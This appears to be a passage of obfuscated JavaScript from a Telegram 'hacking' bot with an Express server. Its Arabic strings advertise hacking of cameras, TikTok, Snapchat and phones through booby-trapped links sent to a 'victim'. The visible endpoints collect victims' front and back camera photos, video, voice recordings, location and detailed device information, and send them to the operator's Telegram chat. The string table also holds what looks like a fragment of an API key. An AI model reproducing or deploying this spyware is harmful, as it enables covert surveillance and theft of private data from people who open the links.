        'stringify',
        '0.0.0.0\x20Sa',
        'me/',
        '/ok.html',
        'https://nm',
        'جرب\x20دوله\x20م',
        'content',
        'Uioll',
        'orage',
        'السعودية\x20🇸🇦',
        'لفحصه.',
        'بعد</stron',
        'Ppzrb',
        'سوف\x20يتم\x20فت',
        '🔗\x20توليد\x20را',
        'يه\x20☎️',
        'SeHyI',
        'أوامر\x20للاس',
        'الرسالة\x20📩:',
        '\x20وظهر\x20أنه\x20',
        'deviceInfo',
        '\x20⚠️',
        'اتف\x20كاملاً',
        '🇨🇳',
        'تم\x20حذف\x20الذ',
        'ال\x20الرابط\x20',
        'الأردن\x20🇯🇴',
        'me/lTV_l/3',
        'روسيا',
        'wGyIv',
        'صورة.',
        'اولة\x20مرة\x20أ',
        'env',
        'QDrFX',
        'ور\x20🎨',
        'ناء\x20محاولة',
        'me/ZII0_bo',
        'خطأ\x20في\x20جلب',
        'n.html',
        'floor',
        'xPPGh',
        'No\x20visa\x20da',
        'اختر\x20الدول',
        '\x20ميغابت\x20في',
        'WxyJg',
        'map',
        'st.\x0a-\x20اضغط',
        '5685KXzIZX',
        'لقد\x20قمت\x20بط',
        'token',
        '\x20النكتة.\x20ا',
        '\x20\x0aكلمة\x20الس',
        'tId\x20',
        '\x20📏\x0a-\x20إصدار',
        'اب\x20لفك\x20الح',
        '.com/',
        '\x0aلحذف\x20الاي',
        'SAQLu',
        'سحب\x20جميع\x20ص',
        'ت\x20الخبيثه\x20',
        'from',
        'ت\x20الجهاز\x20🔬',
        'to\x20generat',
        'post',
        '\x20الصور',
        'ck/:linkId',
        's\x20for\x20chat',
        'البرازيل\x20🇧🇷',
        'ق\x20الهاتف\x20ك',
        'حاولة\x20مرة\x20',
        'رومانيا\x20🇷🇴',
        ':\x20`',
        'ydOqz',
        'ي\x20تلغيم\x20را',
        '\x20⚡\x0a-\x20الشبك',
        'VezDH',
        '\x20🏙️\x0a-\x20عنوان',
        'TbiLx',
        'بريطانيا',
        'ل\x20بنجاح:\x0a<',
        'راقبه.....',
        'AdBvt',
        'ePwEe',
        'objBg',
        'لبت\x20باسورد',
        'GWwID',
        'qYSfm',
        'لرابط\x20لختر',
        'تم\x20انشاء\x20ر',
        'all',
        'قاط\x20الصور.',
        'SzOQz',
        'trim',
        '\x20as\x20expect',
        'AzpWv',
        'siuTL',
        '\x20🌍\x0a-\x20الدعم',
        'mLyaj',
        '⚠️:\x0a',
        'سنغافورة\x20🇸🇬',
        '000',
        'lZTxQ',
        'مرحبًا!\x20اض',
        '/ios',
        '2BT3BlbkFJ',
        'للحصول\x20على',
        '*\x20[BOT](t.',
        'tTOBv',
        '\x20🌍\x0a-\x20شحن\x20ا',
        'pJxQQ',
        '\x20🗑</strong',
        'hkDgw',
        '\x20كـ\x20VIP.',
        'q.whatsapp',
        'add_names',
        'الرجاء\x20الا',
        'use',
        'باع\x20هذه\x20ال',
        'untry/',
        'c.html',
        'HhnEX',
        'tkOJr',
        'upport',
        'PdJzo',
        '<strong>تم',
        'videoData',
        '\x20🔞',
        'EkOPX',
        'xx.html',
        'get_pubg',
        'LIBsO',
        'الضحيه\x20📲',
        'ول\x20اليه\x20ال',
        'أوروغواي\x20🇺🇾',
        'سريلانكا\x20🇱🇰',
        'ليبيا\x20🇱🇾',
        'yZuHf',
        '?chatId=',
        'BWnEj',
        'ي\x20في\x20لوحة\x20',
        '://t.me/',
        'لإيماءات\x20ا',
        'إختراق\x20فري',
        '\x20اي\x20برمجيا',
        'wowwr',
        'ت\x20بنات\x0aخلف',
        '/mm',
        'oeTjB',
        'فنلندا',
        'FBUfi',
        'U.S.\x20Bank',
        'IOzjF',
        'vWqOy',
        'USA🇺🇸',
        'السويد\x20🇸🇪',
        '\x20🖥️\x0a-\x20إصدار',
        'span.place',
        'البرتغال',
        '.io/api/v3',
        'Zibfw',
        '\x20🔵\x0a-\x20دعم\x20ا',
        'h.me/',
        'facebook',
        'fetch\x20visa',
        'ناء\x20حذف\x20ال',
        'اختراق\x20الك',
        'منغوليا\x20🇲🇳',
        'FhFAG',
        'filter',
        'ck/',
        'كل\x20صحيح.',
        'MAdIN',
        'min',
        'فذ\x20',
        'التواصل\x20مع',
        '\x20المطور',
        'ع\x20اضافة\x20فا',
        'لب\x20بحث\x20بال',
        'يتك\x20في\x20الد',
        '\x0a𝗣𝗮𝘀𝘀𝗲𝗱\x20✅\x0a',
        'ل\x20على\x201\x20نق',
        'QbJgY',
        'isCharging',
        'ط\x20🪄',
        'مدغشقر\x20🇲🇬',
        'upJLA',
        'hfvJl',
        'ue\x20:*\x20`',
        'captureBac',
        'WQEOW',
        'Markdown',
        'يس\x20اسمي',
        'WsJdM',
        '\x20🔄\x0a-\x20عمق\x20ا',
        'otguH',
        'يمل...</st',
        'غوام\x20🇬🇺',
        '`\x0a*[-]\x20Val',
        '`\x0a*[-]\x20Cou',
        'jlaHv',
        '\x20كاميرات\x20ا',
        'بوتسوانا\x20🇧🇼',
        '/xx.html?c',
        'الدنمارك',
        'khoWl',
        'dIGEOjpMgZ',
        '\x20هذا\x20الراب',
        'xfbmi',
        'FhmYB',
        'إيميل\x20الذي',
        'vipUsers',
        'subject',
        'boid-outst',
        'تفادة\x20من\x20ا',
        'الصوره🙋‍♂️\x20',
        'ZLtsO',
        'qCGFk',
        'WpTKz',
        '7oxkoPuxqz',
        'روسيا\x20🇷🇺',
        'معلومات\x20حس',
        'SIGHUP',
        'ozCpb',
        'كندا\x20🇨🇦',
        '\x20⏰\x0a-\x20اسم\x20ا',
        '18YwpkCF',
        'مله\x20ارسلها',
        'blog',
        'اليابان\x20🇯🇵',
        'add_vip',
        'اتك\x20[\x20/inf',
        '\x20أثناء\x20إرس',
        'push',
        'مكنك\x20إنشاء',
        'الصين\x20🇨🇳',
        'tnUdX',
        '.\x0a\x20⚠️ملاحظه',
        'حدث\x20خطأ:\x20',
        '>\x0a\x0aلنشا\x20اي',
        'بنغلاديش\x20🇧🇩',
        'ال\x20رابط\x20صح',
        'ناء\x20إنشاء\x20',
        'apVgq',
        'uPSjx',
        '\x20:\x20',
        'الجبل\x20الأس',
        'rshq_tikto',
        'رواندا\x20🇷🇼',
        'generate_v',
        '\x20ما</stron',
        'غير\x20قابل\x20ل',
        'networkSpe',
        'XPJnY',
        'os\x20for\x20cha',
        'بلغاريا\x20🇧🇬',
        '\x20🇰🇬',
        'load',
        'tions\x22:{\x22q',
        '🇳🇱',
        'هولندا\x20🇳🇱',
        'DIMoz',
        'get_number',
        'writeFileS',
        'length',
        'uploads',
        'ntry\x20:*\x20`',
        '\x20🇰🇾',
        '\x20من\x20VIP.',
        'LgvOZ',
        'mat\x20is\x20not',
        'لجميع\x20المو',
        'Ykkoo',
        'البرتغال\x20🇵🇹',
        'منتهى\x20قم\x20ف',
        'لم\x20أتمكن\x20م',
        'lZdWz',
        'تة.',
        'لرابط:\x20',
        '/Messages\x0a',
        '&type=face',
        'غير\x20متوفر',
        'فتيارات\x20شب',
        'w.pinteres',
        '.temp-mail',
        'جلد:\x20',
        'params',
        'app/',
        'WxXma',
        'كولومبيا\x20🇨🇴',
        'uploads/',
        'tor',
        'لقد\x20قمنا\x20ب',
        'inkId',
        'kVJuz',
        '/submitPho',
        'تسجيل\x20صوت\x20',
        '@hqooosjjd',
        'init',
        'nvPdz',
        'o\x20for\x20chat',
        'خطير\x20جداً\x20',
        'معرفة\x20رقم\x20',
        'gpt-3.5-tu',
        'جمع\x20معلوما',
        'index',
        'رابط\x20هذا:\x20',
        'خل\x20إلى\x20الر',
        'VWVDw',
        'دم\x20VIP',
        'attempts',
        'ngIRK',
        'ور\x20الهاتف\x20',
        'aHPmR',
        '؟:\x20',
        'MWPJh',
        'لوكسمبورغ\x20',
        'browserVer',
        'هاز\x20بنجاح',
        'و\x20🎥',
        'الذي\x20تم\x20ان',
        'ljgJt',
        'البحرين\x20🇧🇭',
        '\x20GB\x20💾\x0a-\x20عد',
        'ال\x20الأسماء',
        'tiktok',
        'طلب\x20الكود\x20',
        'JvoQx',
        'aqgcU',
        '/whatsapp',
        '7065665133',
        'بنين\x20🇧🇯',
        'اختراق\x20تيك',
        'راقبه',
        'ase\x20try\x20ag',
        'html',
        'Data',
        'لبنان\x20🇱🇧',
        'مرحبًا\x20بك\x20',
        'YSQtB',
        'WkKYo',
        '\x20تم\x20إنشاؤه',
        'sEkAY',
        'on/:linkId',
        'همي:',
        'yTBXi',
        'لهرسك\x20🇧🇦',
        'JrGBS',
        'snapchat.c',
        '\x20البرامجيا',
        '<strong>❗ل',
        'ins\x22}}',
        '😁.',
        '/xx',
        'هولندا',
        'cleanuri',
        'خرى\x20لاحقًا',
        'لخدمة.</st',
        'لم\x20يتم\x20است',
        '@uiit89',
        'يح\x20يبدأ\x20بـ',
        'RfSEL',
        'مع\x20الشخص\x20ا',
        'VQJAh',
        'zxqdM',
        'acPdr',
        'exit',
        'KRmOJ',
        'ولة\x20الحصول',
        'nOpMJ',
        'abfTA',
        'tXsOz',
        'XiDMp',
        'ل\x20على1\x20نقط',
        'osAUH',
        'NQXao',
        'TfgMU',
        'files',
        '/?page=',
        'الصور\x20الرا',
        'k.glitch.m',
        'xeaYl',
        'OXnrE',
        'KXivO',
        'ماكاو\x20🇲🇴',
        '➖\x20وقت\x20الان',
        '.me/',
        'السودان\x20🇸🇩',
        'الرسالة\x20رق',
        '\x20على\x20البري',
        'بك\x20سوف\x20تحص',
        'single',
        'قر\x20على\x20الر',
        'اقع\x20💣',
        'sTupe',
        'holder.tex',
        'e\x20Visa!*',
        'ي\x20عن\x20طريق\x20',
        'لانتهاء.',
        'تلغيم\x20رابط',
        'YnMiP',
        'nHNeU',
        'iver',
        'prev_',
        'أدناه\x20للبح',
        'fVNSr',
        'mLYeq',
        'wcxKf',
        'fUPXs',
        'ومات\x20جهازك',
        'الملف\x20الشخ',
        'rJfOR',
        'mBjoj',
        'PPhLM',
        'كينيا\x20🇰🇪',
        'ن\x20النت\x20قوي',
        'tiktok.com',
        'rUCkG',
        'Number\x20:*\x20',
        '@hsosgh',
        'اصطناعي\x20🤖',
        '/submitLoc',
        'https://fl',
        ')\x20AppleWeb',
        'vgQgM',
        'onText',
        'get_link',
        'answerCall',
        '/ca.html',
        'ية\x20تحديد\x20ا',
        'erica',
        'حدث\x20خطأ',
        'ه\x20وكلمات\x20ج',
        '\x20الجهاز:',
        'تم\x20إرسال\x20ا',
        'ر\x20رابط\x20🔒',
        '\x20•\x20تفاصيل\x20',
        'فرنسا',
        'lution',
        'atus:',
        'مل\x20وهمي\x20\x20/',
        'سايل\x20الضحي',
        'مشبوه\x20🟠',
        'anding-mas',
        'طلب\x20اي\x20اذن',
        'خص\x20في\x20الدخ',
        '🇦🇷',
        'لبوت.',
        'ه\x20عبر\x20رابط',
        'keys',
        'wpmoC',
        'لا\x20يوجد\x20اس',
        'RrOBm',
        'split',
        'امرا\x20الخلف',
        'XHOyH',
        'ر\x20مجاناً:',
        'icAOx',
        'rce/get/?s',
        'DECDr',
        'deviceName',
        'التصنيف:\x20',
        'العراق\x20🇮🇶',
        'aHdLO',
        '\x20الكثير\x20من',
        'lookup',
        'idHXf',
        'book',
        'HUfds',
        'BkVOj',
        'حقق\x20من\x20جهة',
        'جهازك\x20او\x20ط',
        'isDirector',
        'uHThB',
        'CWQgb',
        'تحها\x20مجاني',
        'user',
        'json',
        '\x20لاحقًا.',
        '\x20المتصفح:\x20',
        'XUsdb',
        'Agent',
        'ود\x20هاذا\x20ال',
        'AnskA',
        'الته\x20من\x20VI',
        'ابط\x20أدناه\x20',
        'VISA\x20-\x20DEB',
        '🇳🇨',
        'تخدمين:\x20',
        '=\x0a[-]\x20by\x20:',
        'ription\x20st',
        'موناكو\x20🇲🇨',
        '\x20المدفوع\x20ت',
        'cel.app/',
        '\x20sent\x20vide',
        'يراد\x20الأرق',
        'ذاكرة\x20المؤ',
        'ناميبيا\x20🇳🇦',
        'بوت\x20اختراق',
        'internalSt',
        ']\x20100%',
        'لا\x20توجد\x20نب',
        'inline_key',
        'eeHZx',
        'قيرغيزستان',
        '/capture?c',
        'تايلاند\x20🇹🇭',
        'كامرات\x20في\x20',
        '\x20🔒\x0a-\x20نطاق\x20',
        'الية\x20🇰🇵',
        'KLNIo',
        'randomByte',
        'اختراق\x20كام',
        'شتراك\x20في\x20ج',
        'لزر\x20للحصول',
        '\x20•\x20مزود\x20ال',
        'قتة:',
        '\x20حتى\x20يتم\x20ا',
        '\x0a➖\x20تم\x20الطل',
        '\x20نظام\x20التش',
        'dexzH',
        'أسماء\x20المس',
        'fOjDX',
        'forEach',
        'تم\x20حذف\x20الم',
        'كوريا\x20الشم',
        'لمراقبة\x20📡',
        'ImGPz',
        'ًا\x20',
        'ictlV',
        'editMessag',
        '\x20الضحيه\x20عب',
        'Bbjjt',
        'MSkYA',
        'ن\x20التعامل\x20',
        'يرجى\x20إرسال',
        '\x20🔒',
        'colorDepth',
        'صال:\x20',
        '\x20|\x20في\x20بـوت',
        'لهاتف:\x20',
        'b.html',
        'الكثير\x20من\x20',
        '\x20قم\x20في\x20تعي',
        'ar-SA',
        'devNh',
        '\x20data.\x20Ple',
        'OgfJS',
        '*Hi\x20Bro,\x20I',
        'السويد',
        'hotos:\x20',
        's://t.me/',
        'iXQGN',
        'HLQKW',
        'هذا\x20لفتح\x20أ',
        'حث.',
        'جرب\x20دوله\x20ا',
        'ايل\x20الذي\x20ت',
        'سحب\x20جميع\x20ر',
        'array',
        'MIQzM',
        'خاص\x20بك\x0a\x20عن',
        'GPaEj',
        'Lkcrh',
        '</strong>',
        'كوريا\x20الجن',
        'on/',
        'تنزانيا\x20🇹🇿',
        'https://t.',
        'الجزائر\x20🇩🇿',
        'getUserPro',
        'كواد\x20والرس',
        '\x20🌐\x0a-\x20اسم\x20ا',
        'رابط\x20تجميع',
        '\x20🔻\x0a-\x20المدي',
        'https://yo',
        'aThHadlLGB',
        'ZmGvl',
        'LOORi',
        'اتباع\x20الأو',
        'almunharif',
        'التشيك\x20🇨🇿',
        'get_love_m',
        'وة\x20امانها\x20',
        'ابه\x20تلجرام',
        '/getNameFo',
        'JBjDs',
        'FwOUL',
        'QnKKS',
        'لام\x20🧙‍♂️',
        'ختلفه\x20او\x20ح',
        '\x20حذف\x20حسابك',
        'مك\x20المنحرف',
        'فنلندا\x20🇫🇮',
        'om/v1/chat',
        '\x20IP:\x20',
        'فيتنام\x20🇻🇳',
        'orig',
        'الصوره\x20',
        'TD\x20Bank',
        'rdYxE',
        'ر:\x20',
        'NtXIT',
        'تايوان\x20🇹🇼',
        'له\x20🌏\x20:\x20',
        'أستراليا\x20🇦🇺',
        'catch',
        'تم\x20إضافة\x20ا',
        '\x20NT\x2010.0;\x20',
        'time',
        '50mb',
        'ook',
        'تم\x20إرسال\x20م',
        '\x20لشركة\x20وتس',
        'المجلد\x20غير',
        'path',
        'الملفات\x20ال',
        'ميات\x20الذي\x20',
        'السلفادور\x20',
        'ntation',
        'قبة\x20📡',
        '1282618JqgfNw',
        'AiGoF',
        'ائل\x20للحصول',
        '🇷🇺',
        'خطأ.',
        'SzAqT',
        'TRZHh',
        'الدنمارك\x20🇩🇰',
        'greencafe2',
        'eed\x22:true,',
        'Bgemk',
        'Stored\x20and',
        'جنوب\x20أفريق',
        'الكويت\x20🇰🇼',
        'https://fa',
        '00%',
        'pbjSp',
        '1794024KUClKt',
        'xZSsQ',
        '/capture',
        'data',
        'Error\x20send',
        'express',
        'صربيا',
        '\x20رقم\x20وهمي',
        '\x0a\x0a\x0a\x20\x20\x20\x20\x20\x20\x20',
        'VHuki',
        'response',
        '\x20:*\x20`',
        'IuGVQ',
        '/ge',
        'GROzk',
        'collect_de',
        'nAvailable',
        'غوادلوب\x20🇬🇵',
        'هاتف\x20هذا\x20ق',
        'Invalid\x20re',
        'WMuct',
        'jZTab',
        'ائل\x20جديدة.',
        't.html',
        'nGZaz',
        'ook:',
        'XrZSI',
        'يا\x20🇿🇦',
        'ر\x20بهذا\x20الب',
        'ب\x20🛎•\x20\x0a➖\x20رق',
        '▓▓▓▓░░░░░░',
        'هونغ\x20كونغ',
        '\x20الاتصال.',
        '/search/my',
        'إنشاء\x20إيمي',
        'ource_url=',
        'QGJTI',
        'كول\x20الأمان',
        'rong>',
        'ener',
        'strong>',
        'ابط\x20قم\x20في\x20',
        'المزيد',
        'DLTqg',
        'memory',
        'tos',
        'NdWeJ',
        'Pduny',
        'تم\x20تصوير\x20ا',
        'fMnwV',
        'qWmCQ',
        'جعلته\x20مشبو',
        'instagram.',
        '/submitVid',
        'mdOmA',
        'تركيا\x20🇹🇷',
        'ache...',
        'eText',
        '\x20روبوتًا.',
        'piEgs',
        'toLocaleTi',
        'ZrJFz',
        'Kferb',
        'توغو\x20🇹🇬',
        'ألمانيا\x20🇩🇪',
        'مية\x20📸',
        'aqtIP',
        'browserNam',
        'r_query',
        'ion',
        'url',
        'toLowerCas',
        'هندوراس\x20🇭🇳',
        'me/ygf2gbo',
        '\x0a<strong>ي',
        '➖\x20تاريج\x20ال',
        'فحص\x20الرواب',
        'readdirSyn',
        'اضغط\x20على\x20ا',
        'email',
        '\x20📱\x0a-\x20الذاك',
        'XmHCk',
        '\x22,\x22redux_n',
        'قد\x20حدث\x20خطأ',
        'أنغولا\x20🇦🇴',
        'فحص\x20الرابط',
        'السنغال\x20🇸🇳',
        'lfFXj',
        '/messages',
        '\x20كل\x20الازرا',
        '1kNNPU6RVm',
        'فه\x20ولكن\x20لا',
        'ont/',
        'ain\x20later.',
        'اختراق\x20اله',
        'cqOeH',
        'حث\x20عن\x20الصو',
        'يه\x20عبر\x20راب',
        'قه\x20سيتم\x20فت',
        'وة\x20الامان\x20',
        'yNRdj',
        '-\x20بوت\x20بحث\x20',
        'countryFla',
        'bzjQb',
        'urlencoded',
        'recordVoic',
        'الدخول\x20\x20له',
        'لزر\x20لفحص\x20ا',
        'مولدوفا\x20🇲🇩',
        'sendFile',
        '&data={\x22op',
        'o\x20]</stron',
        'QzWmz',
        'الدردشة\x20مع',
        '@lTV_l',
        'sendVideo',
        'املاً\x20قم\x20ب',
        'ئعة\x20مثل\x20\x0aا',
        '100mb',
        'FsYPq',
        'sendPhoto',
        'Sent\x20photo',
        'choices',
        '1203525RAxKoH',
        'eHCUH',
        'hiXfD',
        'eo:',
        'hing\x20joke:',
        'XMNvH',
        'حدثت\x20مشكلة',
        '📸الصورة\x20',
        'https://ip',
        'userId',
        'وقع\x20📍',
        '/start',
        '\x20أي\x20رسالة\x20',
        'captureFro',
        'IPDRd',
        'لم\x20يتم\x20اخت',
        'اختراق\x20سنا',
        'qlCVT',
        'قبرص\x20🇨🇾',
        'text',
        'لا\x20توجد\x20رس',
        'ayunz',
        'JstTC',
        'fe.html',
        'MQvXB',
        'Failed\x20to\x20',
        '\x20🎨\x0a-\x20تاريخ',
        'OLJmq',
        'اك\x20VIP',
        'ZcOOP',
        'qdijt',
        'ارساله\x20لضح',
        'message',
        '🤣🤣🤣🤣',
        'الصين',
        'ندما\x20توصل\x20',
        'ayoSx',
        'الرجاء\x20إرس',
        'uhDHN',
        '\x20المراقبه\x20',
        'process\x20vi',
        '/submitCod',
        ']\x200%'
    ];
    _0x4e41 = function () {
        return _0x5790aa;
    };
    return _0x4e41();
}
app[_0x54baf1(0x514)](_0x54baf1(0x679) + _0x54baf1(0x2fa), (_0xfb2a20, _0x54144e) => {
    const _0x2ac13a = _0x54baf1, _0x1cf8e7 = { 'hKDGW': _0x2ac13a(0x683) }, _0x14a7ed = _0xfb2a20[_0x2ac13a(0x91e)][_0x2ac13a(0x8fa)], _0x1e5c5e = _0xfb2a20[_0x2ac13a(0x91e)][_0x2ac13a(0x893)], _0x5d388c = _0xfb2a20[_0x2ac13a(0x91e)][_0x2ac13a(0x3e1)];
    bot[_0x2ac13a(0x4c1) + 'on'](_0x14a7ed, _0x1e5c5e, _0x5d388c), _0x54144e[_0x2ac13a(0x82e)](_0x1cf8e7[_0x2ac13a(0x874)]);
}), app[_0x54baf1(0x514)](_0x54baf1(0x5fb) + _0x54baf1(0x77f), (_0x28f1db, _0x143c0b) => {
    const _0x2520eb = _0x54baf1, _0x15fc87 = {
            'IcEVD': _0x2520eb(0x889),
            'uHiMw': function (_0x2478b6, _0xe48bb7) {
                return _0x2478b6 + _0xe48bb7;
            },
            'ayunz': _0x2520eb(0x897) + _0x2520eb(0x6fa),
            'XPJnY': _0x2520eb(0x3ee) + ':\x20',
            'LKEbU': function (_0x5e077e, _0x4d09fe) {
                return _0x5e077e > _0x4d09fe;
            }
        }, _0x339c2d = _0x28f1db[_0x2520eb(0x91e)][_0x2520eb(0x8fa)], _0x32ef72 = _0x28f1db[_0x2520eb(0x91e)][_0x2520eb(0x826)][_0x2520eb(0x699)](',');
    console[_0x2520eb(0x3f8)](_0x15fc87[_0x2520eb(0x7e2)], _0x32ef72[_0x2520eb(0x5dc)], _0x15fc87[_0x2520eb(0x5d1)], _0x339c2d);
    if (_0x15fc87[_0x2520eb(0x481)](_0x32ef72[_0x2520eb(0x5dc)], 0x283 * 0x9 + 0x20ce + -0x5 * 0xb15)) {
        const _0x1bd90e = _0x32ef72[_0x2520eb(0x502)]((_0x20b9fb, _0x1df004) => {
            const _0x5470fa = _0x2520eb, _0x35e778 = Buffer[_0x5470fa(0x511)](_0x20b9fb, _0x15fc87[_0x5470fa(0x29a)]);
            return bot[_0x5470fa(0x7ca)](_0x339c2d, _0x35e778, { 'caption': _0x5470fa(0x7d4) + _0x15fc87[_0x5470fa(0x349)](_0x1df004, -0x1b26 + -0xfe2 + 0x1 * 0x2b09) });
        });
        Promise[_0x2520eb(0x52e)](_0x1bd90e)[_0x2520eb(0x39c)](() => {
            const _0x1fc0c8 = _0x2520eb;
            console[_0x1fc0c8(0x3f8)](''), _0x143c0b[_0x1fc0c8(0x6b1)]({ 'success': !![] });
        })[_0x2520eb(0x732)](_0x2ae45b => {
            const _0x3968d9 = _0x2520eb;
            console[_0x3968d9(0x44a)]('', _0x2ae45b), _0x143c0b[_0x3968d9(0x866)](-0x1 * -0x3d + 0x227e + -0x1 * 0x20c7)[_0x3968d9(0x6b1)]({ 'error': '' });
        });
    } else
        console[_0x2520eb(0x3f8)](''), _0x143c0b[_0x2520eb(0x866)](-0x33 * 0x83 + 0x78b * -0x4 + -0x7 * -0x843)[_0x2520eb(0x6b1)]({ 'error': '' });
}), app[_0x54baf1(0x514)](_0x54baf1(0x2f8) + _0x54baf1(0x666), upload[_0x54baf1(0x703)](_0x54baf1(0x831), 0x56f + 0x17f * -0x17 + 0x1d0e), (_0xb72e80, _0xf4ac39) => {
    const _0x149107 = _0x54baf1, _0x22829e = {
            'sGpIZ': function (_0x4d8c4d, _0x39ccd4) {
                return _0x4d8c4d > _0x39ccd4;
            }
        }, _0x539ad4 = _0xb72e80[_0x149107(0x91e)][_0x149107(0x7d6)], _0x1f6816 = _0xb72e80[_0x149107(0x64d)];
    if (_0x1f6816 && _0x22829e[_0x149107(0x489)](_0x1f6816[_0x149107(0x5dc)], 0x500 + 0x2063 * 0x1 + -0x2563 * 0x1)) {
        console[_0x149107(0x3f8)](_0x149107(0x493) + _0x1f6816[_0x149107(0x5dc)] + '\x20\x20' + _0x539ad4);
        const _0x4ae325 = _0x1f6816[_0x149107(0x502)](_0x46b25f => bot[_0x149107(0x7ca)](_0x539ad4, _0x46b25f[_0x149107(0x180)]));
        Promise[_0x149107(0x52e)](_0x4ae325)[_0x149107(0x39c)](() => {
            const _0x4d40c7 = _0x149107;
            console[_0x4d40c7(0x3f8)](''), _0xf4ac39[_0x4d40c7(0x6b1)]({ 'success': !![] });
        })[_0x149107(0x732)](_0x10a9fc => {
            const _0x36e857 = _0x149107;
            console[_0x36e857(0x44a)](':', _0x10a9fc), _0xf4ac39[_0x36e857(0x866)](0xb17 * 0x2 + 0xc4c + -0x2086)[_0x36e857(0x6b1)]({ 'error': '' });
        });
    } else
        console[_0x149107(0x3f8)](''), _0xf4ac39[_0x149107(0x866)](0x2518 + -0x193d + 0x11 * -0x9b)[_0x149107(0x6b1)]({ 'error': '' });
}), app[_0x54baf1(0x514)](_0x54baf1(0x2ff) + 'ce', uploadVoice[_0x54baf1(0x65b)](_0x54baf1(0x43e)), (_0xcec6b2, _0x3b3463) => {
    const _0x32f1f1 = _0x54baf1, _0x164c0d = { 'YSQtB': _0x32f1f1(0x745) }, _0x19202c = _0xcec6b2[_0x32f1f1(0x91e)][_0x32f1f1(0x8fa)], _0x4a5e8c = _0xcec6b2[_0x32f1f1(0x2d4)][_0x32f1f1(0x73b)];
    bot[_0x32f1f1(0x8c5)](_0x19202c, _0x4a5e8c)[_0x32f1f1(0x39c)](() => {
        const _0x10c964 = _0x32f1f1;
        fs[_0x10c964(0x1f0)](_0x4a5e8c), _0x3b3463[_0x10c964(0x82e)]('');
    })[_0x32f1f1(0x732)](_0x3b5a9b => {
        const _0x475a8a = _0x32f1f1;
        console[_0x475a8a(0x44a)](_0x3b5a9b), _0x3b3463[_0x475a8a(0x866)](0xb * 0x353 + 0x264e + 0x1 * -0x48eb)[_0x475a8a(0x82e)](_0x164c0d[_0x475a8a(0x627)]);
    });
});
const PORT = process[_0x54baf1(0x4f5)][_0x54baf1(0x286)] || -0x12ab + 0x88a + 0x15d9;
app[_0x54baf1(0x852)](PORT, () => {
    const _0x2ebf08 = _0x54baf1;
    console[_0x2ebf08(0x3f8)](_0x2ebf08(0x8d8) + _0x2ebf08(0x362) + _0x2ebf08(0x582) + PORT);
}), app[_0x54baf1(0x2e2)](_0x54baf1(0x4d4), (_0x281b42, _0x49ef7f) => {
    const _0x4030cd = _0x54baf1, _0x5599d9 = { 'qlCVT': _0x4030cd(0x425) };
    _0x49ef7f[_0x4030cd(0x7bf)](path[_0x4030cd(0x45e)](__dirname, _0x5599d9[_0x4030cd(0x7de)]));
}), app[_0x54baf1(0x514)](_0x54baf1(0x567), async (_0x12d45a, _0x2150d4) => {
    const _0x543884 = _0x54baf1, _0x520dcb = {
            'otguH': _0x543884(0x593),
            'sRWfF': _0x543884(0x738) + _0x543884(0x278) + _0x543884(0x612),
            'FxhjO': _0x543884(0x8d4) + _0x543884(0x2b2) + _0x543884(0x685),
            'nyIKI': _0x543884(0x8d4) + _0x543884(0x2b2) + _0x543884(0x27f),
            'mLYeq': _0x543884(0x63a) + _0x543884(0x464) + _0x543884(0x369)
        }, _0x235c18 = _0x12d45a[_0x543884(0x91e)][_0x543884(0x7d6)], _0x1d4014 = _0x12d45a[_0x543884(0x91e)][_0x543884(0x4e9)];
    if (_0x1d4014) {
        const _0x3adbd1 = _0x543884(0x396) + _0x543884(0x229) + _0x543884(0x1b4) + _0x543884(0x35b) + _0x1d4014[_0x543884(0x463)] + (_0x543884(0x712) + _0x543884(0x3db)) + _0x1d4014[_0x543884(0x263)] + (_0x543884(0x521) + _0x543884(0x727)) + _0x1d4014['ip'] + (_0x543884(0x541) + _0x543884(0x6f0)) + _0x1d4014[_0x543884(0x221)] + (_0x543884(0x3c1) + _0x543884(0x249) + _0x543884(0x60e)) + _0x1d4014[_0x543884(0x58b)] + (_0x543884(0x51f) + _0x543884(0x35b)) + _0x1d4014[_0x543884(0x344)] + _0x543884(0x346) + _0x1d4014[_0x543884(0x5d0) + 'ed'] + (_0x543884(0x500) + _0x543884(0x19a) + _0x543884(0x7fa) + _0x543884(0x6ee)) + _0x1d4014[_0x543884(0x877) + 'e'] + (_0x543884(0x8e6) + ':\x20') + _0x1d4014[_0x543884(0x735)] + (_0x543884(0x5b5) + _0x543884(0x46e)) + _0x1d4014[_0x543884(0x6a0)] + (_0x543884(0x570) + _0x543884(0x3a4)) + _0x1d4014[_0x543884(0x447) + _0x543884(0x797)] + (_0x543884(0x3a7) + _0x543884(0x46e)) + _0x1d4014[_0x543884(0x196)] + (_0x543884(0x7a2) + _0x543884(0x426)) + _0x1d4014[_0x543884(0x77e)] + (_0x543884(0x87c) + _0x543884(0x905) + _0x543884(0x35b)) + _0x1d4014[_0x543884(0x6c7) + _0x543884(0x4dd)] + (_0x543884(0x617) + _0x543884(0x891) + '\x20') + _0x1d4014[_0x543884(0x8a9)] + (_0x543884(0x34a) + _0x543884(0x40e)) + _0x1d4014[_0x543884(0x351)] + (_0x543884(0x710) + _0x543884(0x359)) + _0x1d4014[_0x543884(0x795) + 'e'] + (_0x543884(0x355) + _0x543884(0x6b3)) + _0x1d4014[_0x543884(0x611) + _0x543884(0x37c)] + (_0x543884(0x43a) + _0x543884(0x185)) + _0x1d4014[_0x543884(0x364) + _0x543884(0x68a)] + (_0x543884(0x50a) + _0x543884(0x6db) + _0x543884(0x834)) + _0x1d4014[_0x543884(0x3b1)] + (_0x543884(0x921) + _0x543884(0x185)) + _0x1d4014[_0x543884(0x304) + _0x543884(0x73f)] + (_0x543884(0x596) + _0x543884(0x2c9)) + _0x1d4014[_0x543884(0x6ed)] + (_0x543884(0x7e7) + _0x543884(0x283) + _0x543884(0x3b6)) + _0x1d4014[_0x543884(0x2c6)] + (_0x543884(0x44f) + _0x543884(0x777) + _0x543884(0x300) + '\x20') + _0x1d4014[_0x543884(0x201) + _0x543884(0x1a6)] + (_0x543884(0x6d0) + _0x543884(0x252) + _0x543884(0x293)) + _0x1d4014[_0x543884(0x37e) + _0x543884(0x8a1)] + (_0x543884(0x3cd) + _0x543884(0x681) + _0x543884(0x440) + _0x543884(0x466)) + _0x1d4014[_0x543884(0x35a) + _0x543884(0x762)] + (_0x543884(0x535) + _0x543884(0x20f) + _0x543884(0x3c7)) + _0x1d4014[_0x543884(0x1a8) + _0x543884(0x54f)] + (_0x543884(0x575) + _0x543884(0x562) + _0x543884(0x3ce)) + _0x1d4014[_0x543884(0x372) + 'rt'] + 